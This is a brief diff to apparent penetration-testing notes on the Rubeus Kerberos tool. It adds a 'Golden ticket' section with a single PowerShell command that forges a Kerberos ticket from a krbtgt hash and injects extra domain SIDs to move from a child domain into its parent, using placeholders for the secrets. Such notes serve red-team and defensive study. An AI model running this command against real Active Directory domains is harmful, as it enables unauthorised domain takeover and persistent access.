@@ -68,4 +68,10 @@ $ git clone -b master https://github.com/GhostPack/Rubeus $DEST
 $ # need .NET Framework v4.0 Developer Packs at https://aka.ms/msbuild/developerpacks
 ```
 </div><div>
+
+Golden ticket:
+
+```shell!
+PS> .\Rubeus.exe golden /rc4:<krbtgt hash> /domain:dev.example.com /sid:<child domain SID>  /sids:<target domain SID> /user:dummy /ptt
+```
 </div></div>
